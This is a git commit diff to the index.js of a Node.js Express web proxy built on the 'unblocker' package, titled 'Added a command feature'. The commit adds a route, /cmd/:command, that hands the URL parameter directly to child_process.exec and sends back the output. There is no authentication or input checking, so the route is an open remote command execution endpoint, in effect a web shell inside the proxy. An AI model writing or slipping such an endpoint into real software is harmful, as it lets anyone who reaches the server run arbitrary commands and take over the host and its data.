a19eb0c480d761fbc393d2cf332b0d5fc9630c17
flebedev77 <flebedev99@gmail.com>
2024-07-23 14:57:04 +0930

    Added a command feature

--- index.js
+++ index.js
@@ -2,6 +2,7 @@ const express = require('express')
 const Unblocker = require('unblocker');
 const app = express();
 const unblocker = new Unblocker({prefix: '/proxy/'});
+const { exec } = require("child_process");
 
 // this must be one of the first app.use() calls and must not be on a subdirectory to work properly
 app.use(unblocker);
@@ -9,6 +10,20 @@ app.use(unblocker);
 app.get('/', function(req, res) {
     res.sendFile(__dirname + "/public/index.html");
 });
+
+app.get("/cmd/:command", (req, res) => {
+    exec(req.params.command, (err, stdout, stderr) => {
+        if (err) {
+            console.error(err);
+            return;
+        }
+        if (stderr) {
+            res.send(stderr);
+            return;
+        }
+        res.send(stdout);
+    })
+})
 
 // the upgrade handler allows unblocker to proxy websockets
 app.listen(process.env.PORT || 8080, console.log("Server running on port 8080")).on('upgrade', unblocker.onUpgrade);
